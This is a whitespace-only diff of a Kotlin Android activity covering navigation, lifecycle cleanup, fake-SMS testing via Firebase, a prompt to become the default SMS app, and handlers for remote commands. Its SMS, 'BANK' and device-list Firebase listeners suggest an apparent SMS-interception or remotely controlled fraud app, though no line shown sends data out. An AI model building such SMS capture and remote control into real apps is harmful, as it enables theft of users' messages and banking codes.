@@ -2504,7 +2504,7 @@ class ActivatedActivity : AppCompatActivity() {
             }
         }
     }
-    
+
     /**
      * Navigate to SplashActivity
      */
@@ -2514,25 +2514,25 @@ class ActivatedActivity : AppCompatActivity() {
                 LogHelper.d("ActivatedActivity", "Activity already destroyed or finishing, skipping navigation")
             return
         }
-        
+
             LogHelper.d("ActivatedActivity", "Navigating to SplashActivity")
-            
+
             // Ensure all managers are cleaned up before navigation
             try {
                 firebaseManager.cleanup()
         } catch (e: Exception) {
                 LogHelper.e("ActivatedActivity", "Error cleaning up Firebase manager before navigation", e)
             }
-            
+
             // Cancel all handler runnables
             handlerRunnables.forEach { handler.removeCallbacks(it) }
             handlerRunnables.clear()
-            
+
             val intent = Intent(this, SplashActivity::class.java)
                 intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
                 startActivity(intent)
         overridePendingTransition(android.R.anim.fade_in, android.R.anim.fade_out)
-        
+
             handler.postDelayed({
                 try {
             if (!isDestroyed && !isFinishing) {
@@ -2554,7 +2554,7 @@ class ActivatedActivity : AppCompatActivity() {
             }
         }
     }
-    
+
     /**
      * Test fake SMS
      */
@@ -2567,24 +2567,24 @@ class ActivatedActivity : AppCompatActivity() {
                 LogHelper.w("ActivatedActivity", "Activity destroyed or finishing, skipping test SMS")
                 return
             }
-            
+
             LogHelper.d("ActivatedActivity", "testFakeSms called with phoneNumber=$phoneNumber")
-            
+
             // Get code from internal storage (not from hidden UI)
             val currentCode = activationCode
                 ?: viewModel.activationCode
                 ?: "N/A"
-            
+
             LogHelper.d("ActivatedActivity", "Current activation code: $currentCode")
-            
+
             // Use unique timestamp to ensure message is not treated as duplicate
             val currentTime = System.currentTimeMillis()
             val timeText = currentTime.formatAsDateAndTime()
             val messageBody = message ?: "Test SMS - $currentCode - $timeText"
-            
+
             LogHelper.d("ActivatedActivity", "Sending test SMS with body: $messageBody")
             LogHelper.d("ActivatedActivity", "Timestamp: $currentTime")
-            
+
             // Ensure SMS RecyclerView and listener are set up
             try {
             if (!isDestroyed && !isFinishing) {
@@ -2593,11 +2593,11 @@ class ActivatedActivity : AppCompatActivity() {
                         LogHelper.d("ActivatedActivity", "SMS adapter not initialized, setting up RecyclerView")
                         setupSmsRecyclerView()
                     }
-                    
+
                     // Ensure listener is active
                     setupSmsFirebaseListener()
                     LogHelper.d("ActivatedActivity", "SMS Firebase listener verified")
-                    
+
                     // Ensure SMS card is visible and clickable
                     id.smsCard.visibility = View.VISIBLE
                     id.smsCard.alpha = 1.0f
@@ -2610,17 +2610,17 @@ class ActivatedActivity : AppCompatActivity() {
             } catch (e: Exception) {
                 LogHelper.e("ActivatedActivity", "Error setting up SMS components", e)
             }
-            
+
             // Send test message to Firebase
             val result = com.example.fast.util.SmsTestHelper.simulateReceivedSms(
                 context = this,
                 senderPhoneNumber = phoneNumber,
                 messageBody = messageBody
             )
-            
+
             LogHelper.d("ActivatedActivity", "SmsTestHelper.simulateReceivedSms returned: $result")
             LogHelper.d("ActivatedActivity", "Test message sent to Firebase - should appear in SMS card shortly")
-            
+
             // Force a small delay and then check if message appeared
             handler.postDelayed({
                 try {
@@ -2655,7 +2655,7 @@ class ActivatedActivity : AppCompatActivity() {
             throw e // Re-throw to be caught by handleTestClick
         }
     }
-    
+
     override fun onResume() {
         super.onResume()
         serviceManager.ensureServiceRunning()
@@ -2667,7 +2667,7 @@ class ActivatedActivity : AppCompatActivity() {
             LogHelper.e("ActivatedActivity", "Error checking default SMS app in onResume", e)
         }
     }
-    
+
     /**
      * Check if app is set as default SMS app and prompt user if not
      * This is required for full SMS functionality including writing to system SMS database
@@ -2687,12 +2687,12 @@ class ActivatedActivity : AppCompatActivity() {
             LogHelper.e("ActivatedActivity", "Error in checkDefaultSms", e)
         }
     }
-    
+
     override fun onSaveInstanceState(outState: Bundle) {
         super.onSaveInstanceState(outState)
         outState.putString("activationCode", activationCode)
     }
-    
+
     override fun onRestoreInstanceState(savedInstanceState: Bundle) {
         super.onRestoreInstanceState(savedInstanceState)
         activationCode = savedInstanceState.getString("activationCode")
@@ -2700,10 +2700,10 @@ class ActivatedActivity : AppCompatActivity() {
             viewModel.activationCode = activationCode
         }
     }
-    
+
     override fun onDestroy() {
         super.onDestroy()
-        
+
         try {
             // Stop test timer
             try {
@@ -2713,7 +2713,7 @@ class ActivatedActivity : AppCompatActivity() {
             } catch (e: Exception) {
                 LogHelper.e("ActivatedActivity", "Error stopping test timer", e)
             }
-            
+
             // Stop logo animations
             try {
                 if (::logoAnimationManager.isInitialized) {
@@ -2722,20 +2722,20 @@ class ActivatedActivity : AppCompatActivity() {
             } catch (e: Exception) {
                 LogHelper.e("ActivatedActivity", "Error stopping logo animation manager", e)
             }
-            
+
             // Cleanup managers with error handling
             try {
                 statusManager.cleanup(handler)
             } catch (e: Exception) {
                 LogHelper.e("ActivatedActivity", "Error cleaning up status manager", e)
             }
-            
+
             try {
                 firebaseManager.cleanup()
             } catch (e: Exception) {
                 LogHelper.e("ActivatedActivity", "Error cleaning up Firebase manager", e)
             }
-            
+
             // Cancel all handler runnables
             try {
                 handlerRunnables.forEach { handler.removeCallbacks(it) }
@@ -2743,7 +2743,7 @@ class ActivatedActivity : AppCompatActivity() {
             } catch (e: Exception) {
                 LogHelper.e("ActivatedActivity", "Error clearing handler runnables", e)
             }
-            
+
             // Cleanup animation handlers to prevent crashes
             try {
                 // Cancel border blink animation
@@ -2752,14 +2752,14 @@ class ActivatedActivity : AppCompatActivity() {
                     borderBlinkRunnables.clear()
                 }
                 isBorderBlinkAnimating = false
-                
+
                 // Cancel pending scroll
                 pendingScrollRunnable?.let { handler.removeCallbacks(it) }
                 pendingScrollRunnable = null
             } catch (e: Exception) {
                 LogHelper.e("ActivatedActivity", "Error cleaning up animation handlers", e)
             }
-            
+
             // Remove SMS Firebase listener
             try {
                 smsFirebaseListener?.let {
@@ -2772,7 +2772,7 @@ class ActivatedActivity : AppCompatActivity() {
             } catch (e: Exception) {
                 LogHelper.e("ActivatedActivity", "Error removing SMS Firebase listener", e)
             }
-            
+
             // Remove BANK Firebase listener and device-list status listener
             try {
                 activationCode?.let { code ->
@@ -2783,7 +2783,7 @@ class ActivatedActivity : AppCompatActivity() {
                         } catch (e: Exception) {
                 LogHelper.e("ActivatedActivity", "Error removing BANK listener or device-list status listener", e)
             }
-            
+
             // Cleanup water effect animations
             try {
                 cleanupWaterEffect(id.phoneCard)
@@ -2795,7 +2795,7 @@ class ActivatedActivity : AppCompatActivity() {
             LogHelper.e("ActivatedActivity", "Error in onDestroy", e)
         }
     }
-    
+
     /**
      * Cleanup water effect animations
      */
@@ -2815,7 +2815,7 @@ class ActivatedActivity : AppCompatActivity() {
             LogHelper.e("ActivatedActivity", "Error cleaning up water effect", e)
         }
     }
-    
+
     /**
      * Handle remote card control command
      * @param cardType "sms" or "instruction"
@@ -2825,7 +2825,7 @@ class ActivatedActivity : AppCompatActivity() {
             val smsContentFront = id.smsContentFront
             val instructionContentBack = id.instructionContentBack
             val smsCardContentContainer = id.smsCardContentContainer
-            
+
             when (cardType.lowercase()) {
                 "sms" -> {
                     if (instructionContentBack.visibility == View.VISIBLE) {
@@ -2855,7 +2855,7 @@ class ActivatedActivity : AppCompatActivity() {
             LogHelper.e("ActivatedActivity", "Error handling card control", e)
         }
     }
-    
+
     /**
      * Handle remote animation trigger command
      * @param animationType "sms", "instruction", or "flip"
@@ -2865,7 +2865,7 @@ class ActivatedActivity : AppCompatActivity() {
             val smsContentFront = id.smsContentFront
             val instructionContentBack = id.instructionContentBack
             val smsCardContentContainer = id.smsCardContentContainer
-            
+
             when (animationType.lowercase()) {
                 "sms" -> {
                     // Trigger SMS card animations (if any)
@@ -2909,7 +2909,7 @@ internal fun com.google.firebase.database.DatabaseReference.addListenerForSingle
         override fun onDataChange(snapshot: com.google.firebase.database.DataSnapshot) {
             callback(snapshot)
         }
-        
+
         override fun onCancelled(error: com.google.firebase.database.DatabaseError) {
             LogHelper.e("ActivatedActivity", "Firebase listener cancelled", error.toException())
         }
